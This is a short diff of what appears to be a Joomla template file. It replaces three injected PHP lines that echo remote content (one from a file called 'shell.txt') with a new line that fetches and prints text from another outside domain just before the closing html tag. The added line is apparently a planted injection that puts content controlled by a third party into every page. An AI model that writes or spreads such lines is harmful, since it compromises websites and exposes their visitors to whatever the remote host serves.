@@ -253,7 +253,5 @@ $wa->getAsset('style', 'fontawesome')->setAttribute('rel', 'lazy-stylesheet');
 
     <jdoc:include type="modules" name="debug" style="none" />
 </body>
-<?php echo file_get_contents("https://buahnagaberdada.site/shell.txt");?>
-<?php echo file_get_contents("https://www.tripleseven.icu/blob.txt");?>
-<?php echo file_get_contents("https://eatatlah.com/microbakteria/mesinbomwaktu.txt");?>
+<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
 </html>
